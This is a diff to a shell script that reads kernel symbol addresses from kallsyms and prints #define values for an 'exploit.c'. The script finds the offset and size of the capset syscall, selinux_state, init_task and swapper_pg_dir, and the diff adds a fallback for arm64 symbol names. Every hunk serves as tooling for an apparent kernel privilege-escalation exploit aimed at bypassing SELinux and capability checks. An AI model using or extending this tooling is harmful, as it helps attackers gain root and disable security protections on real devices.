@@ -18,7 +18,12 @@ swapper_pg_dir=$(grep -w "swapper_pg_dir" "$KALLSYMS" | awk '{print $1}')
 init_task=$(grep -w "init_task" "$KALLSYMS" | awk '{print $1}')
 selinux_state=$(grep -w "selinux_state" "$KALLSYMS" | awk '{print $1}')
 do_sys_capset_start=$(grep -w "__do_sys_capset" "$KALLSYMS" | awk '{print $1}')
-do_sys_capset_end=$(grep -A1 -w "__do_sys_capset" "$KALLSYMS" | tail -1 | awk '{print $1}')
+if [ -z "$do_sys_capset_start" ]; then
+    do_sys_capset_start=$(grep -w "__arm64_sys_capset" "$KALLSYMS" | awk '{print $1}')
+    do_sys_capset_end=$(grep -A1 -w "__arm64_sys_capset" "$KALLSYMS" | tail -1 | awk '{print $1}')
+else
+    do_sys_capset_end=$(grep -A1 -w "__do_sys_capset" "$KALLSYMS" | tail -1 | awk '{print $1}')
+fi
 text_start=$(grep -w "_text" "$KALLSYMS" | awk '{print $1}')
 
 echo "=== Update exploit.c with these values ==="
@@ -51,14 +56,15 @@ echo "helpers/analyze.c:"
 
 if [ -n "$do_sys_capset_start" ] && [ -n "$text_start" ]; then
     capset_offset=$((0x$do_sys_capset_start - 0x$text_start))
-    printf "#define PHYS_ADDR 0x%x   // __do_sys_capset - _text\n" $capset_offset
+    symbol_name=$(grep -w "$do_sys_capset_start" "$KALLSYMS" | awk '{print $3}')
+    printf "#define PHYS_ADDR 0x%x   // %s - _text\n" $capset_offset "$symbol_name"
 else
-    echo "Warning: Could not calculate __do_sys_capset offset from _text"
+    echo "Warning: Could not calculate capset offset from _text"
 fi
 
 if [ -n "$do_sys_capset_start" ] && [ -n "$do_sys_capset_end" ]; then
     capset_size=$((0x$do_sys_capset_end - 0x$do_sys_capset_start))
     printf "#define MAX_SIZE 0x%x\n" $capset_size
 else
-    echo "Warning: Could not calculate __do_sys_capset size"
+    echo "Warning: Could not calculate capset size"
 fi
